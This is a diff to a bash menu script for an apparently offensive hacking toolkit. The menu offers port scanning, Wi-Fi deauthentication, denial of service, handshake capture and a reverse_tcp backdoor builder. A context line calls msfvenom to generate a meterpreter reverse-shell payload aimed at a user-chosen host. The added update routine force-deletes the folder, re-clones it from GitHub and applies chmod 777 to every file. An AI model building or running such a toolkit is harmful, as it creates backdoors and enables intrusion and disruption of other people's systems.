@@ -87,8 +87,8 @@ echo '  [+] ports scan : pscan (nmap)      | [+] Deauthentication Attack : da  '
 echo '  ---------------------------------------------------------------------  '
 echo '  [+] denial of service : dos        | [+] backdoor reverse_tcp: backd   '
 echo '  ---------------------------------------------------------------------  '
-echo '  [+] retrival of handshake : rtvh      '
-echo '  ------------------------------------  '
+echo '  [+] retrival of handshake : rtvh   | [+] update                        '
+echo '  ---------------------------------------------------------------------  '
 echo '  [+] install dependances :ind          '
 echo '  ------------------------------------  '
 
@@ -331,6 +331,18 @@ read -p 'port : ' portbd
 echo files name
 read -p 'name : ' namebd
 msfvenom -p $osbd/meterpreter/reverse_tcp lhost=$hostbd -a x86 lport=$portbd > $namebd
+fi
+
+
+if [ $choix = "update" ]
+then
+cd ..
+rm -r -f gs-tooll
+git clone https://github.com/GET-SUM/gs-tooll
+cd gs-tooll
+chmod 777 *
+echo
+echo [updated programme]
 fi
 
 
